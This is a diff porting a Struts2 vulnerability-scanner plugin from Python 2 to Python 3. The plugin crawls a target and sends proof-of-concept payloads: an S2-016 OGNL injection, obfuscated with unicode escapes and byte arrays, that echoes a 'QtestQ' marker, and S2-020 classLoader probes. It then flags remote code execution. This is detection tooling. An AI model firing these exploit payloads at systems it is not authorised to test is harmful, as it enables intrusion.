@@ -1,8 +1,8 @@
 # coding=utf-8
-import urllib2
+import urllib.request, urllib.error, urllib.parse
 import re
-import urlparse
-import HTMLParser
+import urllib.parse
+import html.parser
 
 
 def get_plugin_info():
@@ -21,18 +21,18 @@ def get_plugin_info():
 
 def get_url(domain, timeout):
     url_list = []
-    res = urllib2.urlopen('http://' + domain, timeout=timeout)
+    res = urllib.request.urlopen('http://' + domain, timeout=timeout)
     html = res.read()
     root_url = res.geturl()
     m = re.findall("<a[^>]*?href=('|\")(.*?)\\1", html, re.I)
     if m:
         for url in m:
-            ParseResult = urlparse.urlparse(url[1])
+            ParseResult = urllib.parse.urlparse(url[1])
             if ParseResult.netloc and ParseResult.scheme:
                 if domain == ParseResult.hostname:
-                    url_list.append(HTMLParser.HTMLParser().unescape(url[1]))
+                    url_list.append(html.parser.HTMLParser().unescape(url[1]))
             elif not ParseResult.netloc and not ParseResult.scheme:
-                url_list.append(HTMLParser.HTMLParser().unescape(urlparse.urljoin(root_url, url[1])))
+                url_list.append(html.parser.HTMLParser().unescape(urllib.parse.urljoin(root_url, url[1])))
     return list(set(url_list))
 
 
@@ -40,7 +40,7 @@ def check(ip, port, timeout):
     url_list = get_url(ip + ":" + str(port), timeout)
     flag_list = {
         "S2_016": {"poc": [
-            "redirect:${%23out%3D%23\u0063\u006f\u006e\u0074\u0065\u0078\u0074.\u0067\u0065\u0074(new \u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067(\u006e\u0065\u0077\u0020\u0062\u0079\u0074\u0065[]{99,111,109,46,111,112,101,110,115,121,109,112,104,111,110,121,46,120,119,111,114,107,50,46,100,105,115,112,97,116,99,104,101,114,46,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101})).\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072(),%23\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e(\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067(\u006e\u0065\u0077\u0020\u0062\u0079\u0074\u0065[]{46,46,81,116,101,115,116,81,46,46})),%23\u0072\u0065\u0064\u0069\u0072\u0065\u0063\u0074,%23\u006f\u0075\u0074\u002e\u0063\u006c\u006f\u0073\u0065()}"],
+            "redirect:${%23out%3D%23\\u0063\\u006f\\u006e\\u0074\\u0065\\u0078\\u0074.\\u0067\\u0065\\u0074(new \\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067(\\u006e\\u0065\\u0077\\u0020\\u0062\\u0079\\u0074\\u0065[]{99,111,109,46,111,112,101,110,115,121,109,112,104,111,110,121,46,120,119,111,114,107,50,46,100,105,115,112,97,116,99,104,101,114,46,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101})).\\u0067\\u0065\\u0074\\u0057\\u0072\\u0069\\u0074\\u0065\\u0072(),%23\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e(\\u006e\\u0065\\u0077\\u0020\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067(\\u006e\\u0065\\u0077\\u0020\\u0062\\u0079\\u0074\\u0065[]{46,46,81,116,101,115,116,81,46,46})),%23\\u0072\\u0065\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074,%23\\u006f\\u0075\\u0074\\u002e\\u0063\\u006c\\u006f\\u0073\\u0065()}"],
             "key": "QtestQ"},
         "S2_020": {
             "poc": ["class[%27classLoader%27][%27jarPath%27]=1024", "class[%27classLoader%27][%27resources%27]=1024"],
@@ -66,12 +66,12 @@ def check(ip, port, timeout):
                 for poc in flag_list[ver]['poc']:
                     try:
                         if ver == "S2_045":
-                            request = urllib2.Request(url)
+                            request = urllib.request.Request(url)
                             request.add_header("Content-Type", poc)
                         else:
-                            request = urllib2.Request(url, poc)
-                        res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
+                            request = urllib.request.Request(url, poc)
+                        res_html = urllib.request.urlopen(request, timeout=timeout).read(204800)
                         if flag_list[ver]['key'] in res_html:
-                            return ver + u" 代码执行漏洞"
+                            return ver + " 代码执行漏洞"
                     except:
                         pass
